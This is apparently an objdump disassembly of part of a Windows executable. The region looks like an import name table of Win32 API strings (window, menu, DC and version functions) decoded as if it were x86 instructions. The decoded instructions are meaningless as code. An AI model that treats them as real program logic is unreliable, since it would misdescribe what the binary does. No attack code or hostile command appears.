  428815:	xchg   edx,eax
  428816:	add    al,BYTE PTR [eax]
  428818:	int3   
  428819:	xchg   edx,eax
  42881a:	add    al,BYTE PTR [eax]
  42881c:	(bad)  
  42881d:	xchg   edx,eax
  42881e:	add    al,BYTE PTR [eax]
  428820:	call   0xf8428ab7
  428825:	xchg   edx,eax
  428826:	add    al,BYTE PTR [eax]
  428828:	adc    BYTE PTR [ebx-0x6cdffffe],dl
  42882e:	add    al,BYTE PTR [eax]
  428830:	xor    BYTE PTR [ebx-0x6cbdfffe],dl
  428836:	add    al,BYTE PTR [eax]
  428838:	push   esp
  428839:	xchg   ebx,eax
  42883a:	add    al,BYTE PTR [eax]
  42883c:	pusha  
  42883d:	xchg   ebx,eax
  42883e:	add    al,BYTE PTR [eax]
  428840:	ins    BYTE PTR es:[edi],dx
  428841:	xchg   ebx,eax
  428842:	add    al,BYTE PTR [eax]
  428844:	adc    BYTE PTR [ebx-0x6c69fffe],0x2
  42884b:	add    BYTE PTR [ebx+edx*4-0x6c3ffffe],ch
  428852:	add    al,BYTE PTR [eax]
  428854:	(bad)  
  428855:	xchg   ebx,eax
  428856:	add    al,BYTE PTR [eax]
  428858:	call   0xf4428af0
  42885d:	xchg   ebx,eax
  42885e:	add    al,BYTE PTR [eax]
  428860:	add    al,0x94
  428862:	add    al,BYTE PTR [eax]
  428864:	and    dl,BYTE PTR [edx+eax*1+0x2943c00]
  42886b:	add    BYTE PTR [edx-0x6c],cl
  42886e:	add    al,BYTE PTR [eax]
  428870:	pop    esi
  428871:	xchg   esp,eax
  428872:	add    al,BYTE PTR [eax]
  428874:	jbe    0x42880a
  428876:	add    al,BYTE PTR [eax]
  428878:	mov    dl,BYTE PTR [edx+eax*1+0x2949a00]
  42887f:	add    BYTE PTR [eax-0x3dfffd6c],dh
  428885:	xchg   esp,eax
  428886:	add    al,BYTE PTR [eax]
  428888:	rcl    BYTE PTR [edx+eax*1+0x294e200],1
  42888f:	add    al,dh
  428891:	xchg   esp,eax
  428892:	add    al,BYTE PTR [eax]
  428894:	add    BYTE PTR [ebp-0x6ae9fffe],dl
  42889a:	add    al,BYTE PTR [eax]
  42889c:	sub    al,0x95
  42889e:	add    al,BYTE PTR [eax]
  4288a0:	cmp    al,0x95
  4288a2:	add    al,BYTE PTR [eax]
  4288a4:	push   edx
  4288a5:	xchg   ebp,eax
  4288a6:	add    al,BYTE PTR [eax]
  4288a8:	pop    esp
  4288a9:	xchg   ebp,eax
  4288aa:	add    al,BYTE PTR [eax]
  4288ac:	outs   dx,BYTE PTR ds:[esi]
  4288ad:	xchg   ebp,eax
  4288ae:	add    al,BYTE PTR [eax]
  4288b0:	jle    0x428847
  4288b2:	add    al,BYTE PTR [eax]
  4288b4:	mov    WORD PTR [ebp-0x6a5dfffe],ss
  4288ba:	add    al,BYTE PTR [eax]
  4288bc:	add    BYTE PTR [eax],al
  4288be:	add    BYTE PTR [eax],al
  4288c0:	xchg   edx,eax
  4288c1:	add    edx,DWORD PTR [edx+0x74]
  4288c4:	ins    BYTE PTR es:[edi],dx
  4288c5:	dec    ecx
  4288c6:	outs   dx,BYTE PTR ds:[esi]
  4288c7:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4288cf:	jb     0x42893a
  4288d1:	outs   dx,BYTE PTR ds:[esi]
  4288d2:	add    BYTE PTR [bp+0x74],ch
  4288d6:	fs ins BYTE PTR es:[edi],dx
  4288d8:	ins    BYTE PTR es:[edi],dx
  4288d9:	cs fs ins BYTE PTR es:[edi],dx
  4288dc:	ins    BYTE PTR es:[edi],dx
  4288dd:	add    BYTE PTR [ecx+0x74654701],dl
  4288e3:	push   esi
  4288e4:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4288eb:	dec    edi
  4288ec:	jb     0x428955
  4288ee:	inc    ebp
  4288ef:	js     0x4288f1
  4288f1:	add    BYTE PTR [edx+0x74654701],cl
  4288f7:	push   esp
  4288f8:	gs js  0x42896f
  4288fb:	inc    ebp
  4288fc:	js     0x428972
  4288fe:	outs   dx,BYTE PTR gs:[esi]
  428900:	je     0x428952
  428902:	outs   dx,DWORD PTR ds:[esi]
  428903:	imul   ebp,DWORD PTR [esi+0x74],0x1fb0057
  42890a:	push   ebx
  42890b:	gs je  0x428962
  42890e:	gs js  0x428985
  428911:	inc    ecx
  428912:	ins    BYTE PTR es:[edi],dx
  428913:	imul   esp,DWORD PTR [edi+0x6e],0xd50000
  42891a:	inc    ebp
  42891b:	js     0x428991
  42891d:	push   esp
  42891e:	gs js  0x428995
  428921:	dec    edi
  428922:	jne    0x428998
  428924:	push   edi
  428925:	add    BYTE PTR [eax],dl
  428927:	add    dl,BYTE PTR [edx+esi*2+0x61]
  42892b:	outs   dx,BYTE PTR ds:[esi]
  42892c:	jae    0x42899a
  42892e:	popa   
  42892f:	je     0x428996
  428931:	inc    ebx
  428932:	push   0x65737261
  428937:	je     0x428982
  428939:	outs   dx,BYTE PTR ds:[esi]
  42893a:	outs   dx,WORD PTR ds:[esi]
  42893c:	add    BYTE PTR [eax],al
  42893e:	pop    ss
  42893f:	add    dl,BYTE PTR [edi+0x69]
  428942:	fs outs dx,BYTE PTR gs:[esi]
  428945:	push   eax
  428946:	popa   
  428947:	je     0x4289b1
  428949:	add    BYTE PTR [ebp+0x65724300],cl
  42894f:	popa   
  428950:	je     0x4289b7
  428952:	inc    ebx
  428953:	outs   dx,DWORD PTR ds:[esi]
  428954:	ins    DWORD PTR es:[edi],dx
  428955:	jo     0x4289b8
  428957:	je     0x4289c2
  428959:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  42895d:	inc    ebx
  42895e:	add    BYTE PTR [eax],al
  428960:	mov    bh,0x1
  428962:	push   eax
  428963:	outs   dx,DWORD PTR ds:[esi]
  428964:	ins    BYTE PTR es:[edi],dx
  428965:	jns    0x4289d3
  428967:	imul   ebp,DWORD PTR [esi+0x65],0x1940000
  42896e:	inc    edi
  42896f:	gs je  0x4289c9
  428972:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  428979:	addr16 inc ebp
  42897b:	js     0x42897d
  42897d:	add    cl,ch
  42897f:	add    DWORD PTR [ebx+0x65],edx
  428982:	je     0x4289d0
  428984:	popa   
  428985:	jns    0x4289f6
  428987:	jne    0x4289fd
  428989:	add    bl,dl
  42898b:	add    DWORD PTR [ebx+0x65],edx
  42898e:	je     0x4289d1
  428990:	bound  ebp,QWORD PTR [edi+0x72]
  428993:	je     0x4289e5
  428995:	jb     0x428a06
  428997:	arpl   WORD PTR [eax],ax
  428999:	add    BYTE PTR [edx],cl
  42899b:	add    dl,BYTE PTR [ebx+0x74]
  42899e:	jb     0x428a05
  4289a0:	je     0x428a05
  4289a2:	push   0x69424944
  4289a7:	je     0x428a1c
  4289a9:	add    BYTE PTR [ebx+0x1],al
  4289ac:	inc    edi
  4289ad:	gs je  0x4289f4
  4289b0:	dec    ecx
  4289b1:	inc    edx
  4289b2:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655301eb
  4289ba:	je     0x428a09
  4289bc:	popa   
  4289bd:	jo     0x428a0c
  4289bf:	outs   dx,DWORD PTR ds:[esi]
  4289c0:	fs add BYTE PTR gs:[eax],al
  4289c4:	daa    
  4289c5:	add    DWORD PTR [edi+0x65],eax
  4289c8:	je     0x428a0c
  4289ca:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  4289ce:	add    BYTE PTR gs:[ebx+0x66664f01],ah
  4289d5:	jae    0x428a3c
  4289d7:	je     0x428a2b
  4289d9:	outs   dx,BYTE PTR ds:[si]
  4289db:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  4289e2:	jo     0x428a57
  4289e4:	gs add ah,cl
  4289e7:	add    DWORD PTR [ebx+0x63],edx
  4289ea:	popa   
  4289eb:	ins    BYTE PTR es:[edi],dx
  4289ec:	gs push edi
  4289ee:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4289f5:	je     0x428a3c
  4289f7:	js     0x4289f9
  4289f9:	add    BYTE PTR [edx+0x1],bh
  4289fc:	inc    edi
  4289fd:	gs je  0x428a53
  428a00:	je     0x428a71
  428a02:	arpl   WORD PTR [ebx+0x4f],bp
  428a05:	bound  ebp,QWORD PTR [edx+0x65]
  428a08:	arpl   WORD PTR [eax+eax*1+0x0],si
  428a0c:	call   0x5465:0x6e694c01
  428a13:	outs   dx,DWORD PTR ds:[esi]
  428a14:	add    BYTE PTR [eax],al
  428a16:	mov    dh,0x1
  428a18:	push   eax
  428a19:	outs   dx,DWORD PTR ds:[esi]
  428a1a:	ins    BYTE PTR es:[edi],dx
  428a1b:	jns    0x428a84
  428a1d:	outs   dx,DWORD PTR ds:[esi]
  428a1e:	outs   dx,BYTE PTR ds:[esi]
  428a1f:	add    BYTE PTR [esi+0x1],bh
  428a22:	inc    edi
  428a23:	gs je  0x428a7a
  428a26:	gs js  0x428a9d
  428a29:	inc    ecx
  428a2a:	ins    BYTE PTR es:[edi],dx
  428a2b:	imul   esp,DWORD PTR [edi+0x6e],0x18c0000
  428a32:	inc    edi
  428a33:	gs je  0x428a8a
  428a36:	gs js  0x428aad
  428a39:	inc    esi
  428a3a:	popa   
  428a3b:	arpl   WORD PTR [ebp+0x57],sp
  428a3e:	add    BYTE PTR [eax],al
  428a40:	mov    ebx,0x61655201
  428a45:	ins    BYTE PTR es:[edi],dx
  428a46:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428a4d:	je     0x428ac3
  428a4f:	add    BYTE PTR gs:[eax],al
  428a52:	mov    DWORD PTR [ecx],0x69736552
  428a58:	jp     0x428abf
  428a5a:	push   eax
  428a5b:	popa   
  428a5c:	ins    BYTE PTR es:[edi],dx
  428a5d:	gs je  0x428ad4
  428a60:	add    BYTE PTR gs:[ecx+0x6d6f4300],al
  428a67:	bound  ebp,QWORD PTR [ecx+0x6e]
  428a6a:	gs push edx
  428a6c:	outs   dx,BYTE PTR ds:[si]
  428a6e:	add    BYTE PTR [eax],al
  428a70:	push   cs
  428a71:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  428a75:	je     0x428ac6
  428a77:	jne    0x428aed
  428a79:	inc    ecx
  428a7a:	add    BYTE PTR [eax],al
  428a7c:	test   DWORD PTR [ecx],0x52746553
  428a82:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428a87:	outs   dx,BYTE PTR ds:[esi]
  428a88:	add    BYTE PTR [eax],al
  428a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a8b:	add    BYTE PTR [ebx+0x72],al
  428a8e:	gs popa 
  428a90:	je     0x428af7
  428a92:	push   eax
  428a93:	popa   
  428a94:	ins    BYTE PTR es:[edi],dx
  428a95:	gs je  0x428b0c
  428a98:	add    BYTE PTR gs:[ecx+eax*1],ah
  428a9c:	inc    edi
  428a9d:	gs je  0x428ae2
  428aa0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428aa8:	jae    0x428aaa
  428aaa:	mov    DWORD PTR [eax],0x6d756e45
  428ab0:	inc    esi
  428ab1:	outs   dx,DWORD PTR ds:[esi]
  428ab2:	outs   dx,BYTE PTR ds:[esi]
  428ab3:	je     0x428b28
  428ab5:	push   edi
  428ab6:	add    BYTE PTR [eax],al
  428ab8:	lods   al,BYTE PTR ds:[esi]
  428ab9:	add    BYTE PTR [ebx+0x72],al
  428abc:	gs popa 
  428abe:	je     0x428b25
  428ac0:	push   edx
  428ac1:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ac6:	outs   dx,BYTE PTR ds:[esi]
  428ac7:	dec    ecx
  428ac8:	outs   dx,BYTE PTR ds:[esi]
  428ac9:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  428ad1:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428ad5:	gs inc esp
  428ad7:	inc    esp
  428ad8:	inc    ecx
  428ad9:	add    ch,dl
  428adb:	add    DWORD PTR [ebx+0x65],edx
  428ade:	je     0x428b22
  428ae0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428ae8:	jae    0x428aea
  428aea:	mov    BYTE PTR [eax],al
  428aec:	inc    ebx
  428aed:	jb     0x428b54
  428aef:	popa   
  428af0:	je     0x428b57
  428af2:	inc    edx
  428af3:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428afb:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428b02:	mov    es,WORD PTR [ecx]
  428b04:	inc    edi
  428b05:	gs je  0x428b5c
  428b08:	gs js  0x428b7f
  428b0b:	dec    ebp
  428b0c:	gs je  0x428b81
  428b0f:	imul   esp,DWORD PTR [ebx+0x73],0x1da0057
  428b16:	push   ebx
  428b17:	gs je  0x428b5c
  428b1a:	jb     0x428b91
  428b1c:	jae    0x428b86
  428b1e:	dec    edi
  428b1f:	jb     0x428b88
  428b21:	inc    ebp
  428b22:	js     0x428b24
  428b24:	mov    esp,0x63655201
  428b29:	je     0x428b74
  428b2b:	outs   dx,BYTE PTR ds:[esi]
  428b2c:	push   edx
  428b2d:	imul   ebp,DWORD PTR gs:[bx+0x6e],0xcd0000
  428b36:	inc    ebp
  428b37:	jae    0x428b9c
  428b39:	popa   
  428b3a:	jo     0x428ba1
  428b3c:	add    BYTE PTR [eax],al
  428b3e:	scas   eax,DWORD PTR es:[edi]
  428b3f:	add    DWORD PTR [eax+0x6f],edx
  428b42:	ins    BYTE PTR es:[edi],dx
  428b43:	jns    0x428b87
  428b45:	gs jp  0x428bb1
  428b48:	gs jb  0x428b4b
  428b4b:	add    BYTE PTR [ebx+0x65724300],ch
  428b51:	popa   
  428b52:	je     0x428bb9
  428b54:	push   edx
  428b55:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b5a:	outs   dx,BYTE PTR ds:[esi]
  428b5b:	add    BYTE PTR [edi+0x65724300],cl
  428b61:	popa   
  428b62:	je     0x428bc9
  428b64:	inc    esp
  428b65:	inc    ebx
  428b66:	push   edi
  428b67:	add    BYTE PTR ds:0x74654701,bh
  428b6d:	inc    ebx
  428b6e:	jne    0x428be2
  428b70:	jb     0x428bd7
  428b72:	outs   dx,BYTE PTR ds:[esi]
  428b73:	je     0x428bc4
  428b75:	bound  ebp,QWORD PTR [edx+0x65]
  428b78:	arpl   WORD PTR [eax+eax*1+0x0],si
  428b7c:	inc    edi
  428b7d:	inc    esp
  428b7e:	dec    ecx
  428b7f:	xor    esi,DWORD PTR [edx]
  428b81:	cs fs ins BYTE PTR es:[edi],dx
  428b84:	ins    BYTE PTR es:[edi],dx
  428b85:	add    BYTE PTR [ebx+0x6f],ah
  428b88:	outs   dx,BYTE PTR ds:[esi]
  428b89:	jae    0x428bfa
  428b8b:	ins    BYTE PTR es:[edi],dx
  428b8c:	gs cs fs ins BYTE PTR es:[edi],dx
  428b90:	ins    BYTE PTR es:[edi],dx
  428b91:	add    BYTE PTR [ecx],bh
  428b93:	add    BYTE PTR [ebx+0x68],al
  428b96:	popa   
  428b97:	jb     0x428bee
  428b99:	jo     0x428c0b
  428b9b:	gs jb  0x428bf5
  428b9e:	add    BYTE PTR [eax],al
  428ba0:	dec    esi
  428ba1:	add    dl,BYTE PTR [ebx+0x65]
  428ba4:	je     0x428bf3
  428ba6:	outs   dx,BYTE PTR gs:[esi]
  428ba8:	jne    0x428bf3
  428baa:	je     0x428c11
  428bac:	ins    DWORD PTR es:[edi],dx
  428bad:	dec    ecx
  428bae:	outs   dx,BYTE PTR ds:[esi]
  428baf:	outs   dx,WORD PTR ds:[esi]
  428bb1:	push   edi
  428bb2:	add    BYTE PTR [eax],al
  428bb4:	scas   al,BYTE PTR es:[edi]
  428bb5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428bb9:	fs inc ebx
  428bbb:	jne    0x428c2f
  428bbd:	jae    0x428c2e
  428bbf:	jb     0x428c18
  428bc1:	add    BYTE PTR [eax+0x0],bl
  428bc4:	inc    ebx
  428bc5:	jb     0x428c2c
  428bc7:	popa   
  428bc8:	je     0x428c2f
  428bca:	inc    esp
  428bcb:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  428bd2:	jb     0x428c35
  428bd4:	ins    DWORD PTR es:[edi],dx
  428bd5:	inc    ecx
  428bd6:	add    BYTE PTR [eax],al
  428bd8:	popf   
  428bd9:	add    DWORD PTR [ecx+0x73],ecx
  428bdc:	dec    ebp
  428bdd:	outs   dx,BYTE PTR gs:[esi]
  428bdf:	jne    0x428be1
  428be1:	add    BYTE PTR [eax+0x1],ch
  428be4:	inc    edi
  428be5:	gs je  0x428c3f
  428be8:	imul   ebp,DWORD PTR [esi+0x64],0x6200776f
  428bef:	add    DWORD PTR [edi+0x65],eax
  428bf2:	je     0x428c48
  428bf4:	outs   dx,DWORD PTR ds:[esi]
  428bf5:	jo     0x428c4e
  428bf7:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428bfe:	mov    ds:0x57734901,eax
  428c03:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  428c0a:	jae    0x428c75
  428c0c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  428c10:	sub    eax,0x74654701
  428c15:	dec    ebp
  428c16:	outs   dx,BYTE PTR gs:[esi]
  428c18:	jne    0x428c5d
  428c1a:	push   0x4d6b6365
  428c1f:	popa   
  428c20:	jb     0x428c8d
  428c22:	inc    esp
  428c23:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  428c2a:	outs   dx,BYTE PTR ds:[esi]
  428c2b:	jae    0x428c2d
  428c2d:	add    BYTE PTR [edx],bl
  428c2f:	add    BYTE PTR [ebx+0x61],al
  428c32:	ins    BYTE PTR es:[edi],dx
  428c33:	ins    BYTE PTR es:[edi],dx
  428c34:	push   edi
  428c35:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428c3c:	outs   dx,DWORD PTR ds:[esi]
  428c3d:	arpl   WORD PTR [ecx+0x0],ax
  428c40:	repz add BYTE PTR [edi+0x65],al
  428c44:	je     0x428c89
  428c46:	popa   
  428c47:	jb     0x428cae
  428c49:	je     0x428c9b
  428c4b:	outs   dx,DWORD PTR ds:[esi]
  428c4c:	jae    0x428c4e
  428c4e:	ret    0x7702
  428c51:	jbe    0x428cc6
  428c53:	jo     0x428cc7
  428c55:	imul   ebp,DWORD PTR [esi+0x74],0x5766
  428c5c:	test   al,0x1
  428c5e:	dec    esp
  428c5f:	outs   dx,DWORD PTR ds:[esi]
  428c60:	popa   
  428c61:	fs inc ecx
  428c63:	arpl   WORD PTR [ebx+0x65],sp
  428c66:	ins    BYTE PTR es:[edi],dx
  428c67:	gs jb  0x428ccb
  428c6a:	je     0x428cdb
  428c6c:	jb     0x428ce1
  428c6e:	push   edi
  428c6f:	add    BYTE PTR [edi],cl
  428c71:	add    BYTE PTR [edx+0x72],al
  428c74:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  428c7b:	outs   dx,DWORD PTR ds:[esi]
  428c7c:	ja     0x428cd2
  428c7e:	outs   dx,DWORD PTR ds:[esi]
  428c7f:	push   esp
  428c80:	outs   dx,DWORD PTR ds:[esi]
  428c81:	jo     0x428c83
  428c83:	add    BYTE PTR [ecx+0x66654400],cl
  428c89:	inc    esi
  428c8a:	jb     0x428ced
  428c8c:	ins    DWORD PTR es:[edi],dx
  428c8d:	gs push eax
  428c8f:	jb     0x428d00
  428c91:	arpl   WORD PTR [ecx+0x0],ax
  428c94:	mov    ebx,0x61724400
  428c99:	ja     0x428cef
  428c9b:	gs js  0x428d12
  428c9e:	inc    ebp
  428c9f:	js     0x428cf8
  428ca1:	add    BYTE PTR [edx+0x666e4901],al
  428ca7:	ins    BYTE PTR es:[edi],dx
  428ca8:	popa   
  428ca9:	je     0x428d10
  428cab:	push   edx
  428cac:	arpl   WORD PTR gs:[eax+eax*1+0x5],si
  428cb1:	add    dl,BYTE PTR [edx+0x65]
  428cb4:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428cbc:	popa   
  428cbd:	jae    0x428d32
  428cbf:	push   edi
  428cc0:	add    BYTE PTR [eax],al
  428cc2:	inc    ebp
  428cc3:	add    dl,BYTE PTR [ebx+0x65]
  428cc6:	je     0x428d14
  428cc8:	popa   
  428cc9:	jae    0x428d3f
  428ccb:	inc    ebp
  428ccc:	jb     0x428d40
  428cce:	outs   dx,DWORD PTR ds:[esi]
  428ccf:	jb     0x428d16
  428cd1:	js     0x428cd3
  428cd3:	add    BYTE PTR [edx+0x43734901],dl
  428cd9:	push   0x70557261
  428cde:	jo     0x428d45
  428ce0:	jb     0x428d23
  428ce2:	add    BYTE PTR [eax],al
  428ce4:	inc    ebx
  428ce5:	add    BYTE PTR [ebx+0x6c],al
  428ce8:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  428cef:	arpl   WORD PTR [edx+0x65],si
  428cf2:	outs   dx,BYTE PTR gs:[esi]
  428cf4:	add    BYTE PTR [eax],al
  428cf6:	push   ecx
  428cf7:	add    dl,BYTE PTR [ebx+0x65]
  428cfa:	je     0x428d4c
  428cfc:	popa   
  428cfd:	jb     0x428d64
  428cff:	outs   dx,BYTE PTR ds:[esi]
  428d00:	je     0x428d02
  428d02:	xchg   ecx,eax
  428d03:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428d07:	arpl   WORD PTR [ebx+0x50],bp
  428d0a:	outs   dx,DWORD PTR ds:[esi]
  428d0b:	jo     0x428d82
  428d0d:	jo     0x428d5c
  428d0f:	outs   dx,BYTE PTR gs:[esi]
  428d11:	jne    0x428d58
  428d13:	js     0x428d15
  428d15:	add    BYTE PTR [edx],ah
  428d17:	add    DWORD PTR [edi+0x65],eax
  428d1a:	je     0x428d67
  428d1c:	gs jns 0x428d81
  428d1f:	outs   dx,DWORD PTR ds:[esi]
  428d20:	popa   
  428d21:	jb     0x428d87
  428d23:	dec    esp
  428d24:	popa   
  428d25:	jns    0x428d96
  428d27:	jne    0x428d9d
  428d29:	add    bl,bh
  428d2b:	add    BYTE PTR [edi+0x65],al
  428d2e:	je     0x428d73
  428d30:	ins    BYTE PTR es:[edi],dx
  428d31:	popa   
  428d32:	jae    0x428da7
  428d34:	dec    esi
  428d35:	popa   
  428d36:	ins    DWORD PTR es:[edi],dx
  428d37:	gs push edi
  428d39:	add    ch,bl
  428d3b:	add    BYTE PTR [ebp+0x71],al
  428d3e:	jne    0x428da1
  428d40:	ins    BYTE PTR es:[edi],dx
  428d41:	push   edx
  428d42:	arpl   WORD PTR gs:[eax+eax*1+0x32],si
  428d47:	add    dl,BYTE PTR [ebx+0x65]
  428d4a:	je     0x428d8f
  428d4c:	popa   
  428d4d:	jb     0x428db4
  428d4f:	je     0x428da1
  428d51:	outs   dx,DWORD PTR ds:[esi]
  428d52:	jae    0x428d54
  428d54:	and    al,0x0
  428d56:	inc    ebx
  428d57:	push   0x65676e61
  428d5c:	dec    ebp
  428d5d:	outs   dx,BYTE PTR gs:[esi]
  428d5f:	jne    0x428db8
  428d61:	add    BYTE PTR [eax+0x73654400],bl
  428d67:	je     0x428ddb
  428d69:	outs   dx,DWORD PTR ds:[esi]
  428d6a:	jns    0x428dc3
  428d6c:	imul   ebp,DWORD PTR [esi+0x64],0xf500776f
  428d73:	add    DWORD PTR [eax+0x6f],edx
  428d76:	jae    0x428dec
  428d78:	push   esp
  428d79:	push   0x64616572
  428d7e:	dec    ebp
  428d7f:	gs jae 0x428df5
  428d82:	popa   
  428d83:	addr16 gs push edi
  428d86:	add    BYTE PTR [eax],al
  428d88:	push   edi
  428d89:	add    dl,BYTE PTR [ebx+0x65]
  428d8c:	je     0x428dde
  428d8e:	jb     0x428dff
  428d90:	jo     0x428de9
  428d92:	add    BYTE PTR [eax],al
  428d94:	mov    al,0x1
  428d96:	dec    esp
  428d97:	outs   dx,DWORD PTR ds:[esi]
  428d98:	popa   
  428d99:	fs dec ecx
  428d9b:	arpl   WORD PTR [edi+0x6e],bp
  428d9e:	push   edi
  428d9f:	add    bl,bh
  428da1:	add    DWORD PTR [eax+0x74],edx
  428da4:	dec    ecx
  428da5:	outs   dx,BYTE PTR ds:[esi]
  428da6:	push   edx
  428da7:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428dac:	dec    edx
  428dad:	add    dl,BYTE PTR [ebx+0x65]
  428db0:	je     0x428dff
  428db2:	outs   dx,BYTE PTR gs:[esi]
  428db4:	jne    0x428dfa
  428db6:	gs popaw 
  428db9:	jne    0x428e27
  428dbb:	je     0x428e06
  428dbd:	je     0x428e24
  428dbf:	ins    DWORD PTR es:[edi],dx
  428dc0:	add    BYTE PTR [eax],al
  428dc2:	sti    
  428dc3:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428dc7:	arpl   WORD PTR [ebx+0x50],bp
  428dca:	outs   dx,DWORD PTR ds:[esi]
  428dcb:	jo     0x428e42
  428dcd:	jo     0x428e1c
  428dcf:	outs   dx,BYTE PTR gs:[esi]
  428dd1:	jne    0x428dd3
  428dd3:	add    BYTE PTR [ebp+0x64705502],ah
  428dd9:	popa   
  428dda:	je     0x428e41
  428ddc:	push   edi
  428ddd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428de4:	push   ss
  428de5:	add    dl,BYTE PTR [edx+0x65]
  428de8:	ins    DWORD PTR es:[edi],dx
  428de9:	outs   dx,DWORD PTR ds:[esi]
  428dea:	jbe    0x428e51
  428dec:	dec    ebp
  428ded:	outs   dx,BYTE PTR gs:[esi]
  428def:	jne    0x428df1
  428df1:	add    BYTE PTR [edx+0x61724400],dh
  428df7:	ja     0x428e3f
  428df9:	jb     0x428e5c
  428dfb:	ins    DWORD PTR es:[edi],dx
  428dfc:	gs inc ebx
  428dfe:	outs   dx,DWORD PTR ds:[esi]
  428dff:	outs   dx,BYTE PTR ds:[esi]
  428e00:	je     0x428e74
  428e02:	outs   dx,DWORD PTR ds:[esi]
  428e03:	ins    BYTE PTR es:[edi],dx
  428e04:	add    BYTE PTR [eax],al
  428e06:	mov    dl,0x1
  428e08:	dec    esp
  428e09:	outs   dx,DWORD PTR ds:[esi]
  428e0a:	popa   
  428e0b:	fs dec ecx
  428e0d:	ins    DWORD PTR es:[edi],dx
  428e0e:	popa   
  428e0f:	addr16 gs push edi
  428e12:	add    BYTE PTR [eax],al
  428e14:	add    al,BYTE PTR [eax]
  428e16:	inc    ecx
  428e17:	fs push 0x75
  428e1a:	jae    0x428e90
  428e1c:	push   edi
  428e1d:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428e24:	arpl   WORD PTR [eax+eax*1+0x0],si
  428e28:	add    DWORD PTR [ecx],0x65536e49
  428e2e:	outs   dx,BYTE PTR ds:[esi]
  428e2f:	fs dec ebp
  428e31:	gs jae 0x428ea7
  428e34:	popa   
  428e35:	addr16 gs inc ebp
  428e38:	js     0x428e3a
  428e3a:	xchg   BYTE PTR [ecx],al
  428e3c:	dec    ecx
  428e3d:	outs   dx,BYTE PTR ds:[esi]
  428e3e:	jae    0x428ea5
  428e40:	jb     0x428eb6
  428e42:	dec    ebp
  428e43:	outs   dx,BYTE PTR gs:[esi]
  428e45:	jne    0x428e9e
  428e47:	add    BYTE PTR ds:0x6c6c4100,al
  428e4d:	outs   dx,DWORD PTR ds:[esi]
  428e4e:	ja     0x428ea3
  428e50:	gs je  0x428e99
  428e53:	outs   dx,DWORD PTR ds:[esi]
  428e54:	jb     0x428ebb
  428e56:	addr16 jb 0x428ec8
  428e59:	jne    0x428ec9
  428e5b:	fs push edi
  428e5d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428e64:	add    BYTE PTR [edx],0x53
  428e67:	ja     0x428eca
  428e69:	jo     0x428eb8
  428e6b:	outs   dx,DWORD PTR ds:[esi]
  428e6c:	jne    0x428ee1
  428e6e:	gs inc edx
  428e70:	jne    0x428ee6
  428e72:	je     0x428ee3
  428e74:	outs   dx,BYTE PTR ds:[esi]
  428e75:	add    bh,ch
  428e77:	add    DWORD PTR [eax+0x65],edx
  428e7a:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  428e7f:	jae    0x428ee2
  428e81:	addr16 gs push edi
  428e84:	add    BYTE PTR [eax],al
  428e86:	cdq    
  428e87:	add    BYTE PTR [ecx+ebp*2+0x61],al
  428e8b:	ins    BYTE PTR es:[edi],dx
  428e8c:	outs   dx,DWORD PTR ds:[esi]
  428e8d:	addr16 inc edx
  428e8f:	outs   dx,DWORD PTR ds:[esi]
  428e90:	js     0x428edb
  428e92:	outs   dx,BYTE PTR ds:[esi]
  428e93:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428e9b:	jb     0x428efe
  428e9d:	ins    DWORD PTR es:[edi],dx
  428e9e:	inc    ecx
  428e9f:	add    BYTE PTR [ebp+0x0],bl
  428ea2:	inc    ebx
  428ea3:	jb     0x428f0a
  428ea5:	popa   
  428ea6:	je     0x428f0d
  428ea8:	dec    ecx
  428ea9:	arpl   WORD PTR [edi+0x6e],bp
  428eac:	dec    ecx
  428ead:	outs   dx,BYTE PTR ds:[esi]
  428eae:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  428eb6:	stos   BYTE PTR es:[edi],al
  428eb7:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428ebb:	fs inc edx
  428ebd:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb1005770
  428ec5:	add    dl,BYTE PTR [esi+0x6b]
  428ec8:	dec    ebx
  428ec9:	gs jns 0x428f1f
  428ecc:	arpl   WORD PTR [ecx+0x6e],sp
  428ecf:	push   edi
  428ed0:	add    BYTE PTR [eax],al
  428ed2:	adc    eax,DWORD PTR [ecx]
  428ed4:	inc    edi
  428ed5:	gs je  0x428f1c
  428ed8:	outs   dx,DWORD PTR ds:[esi]
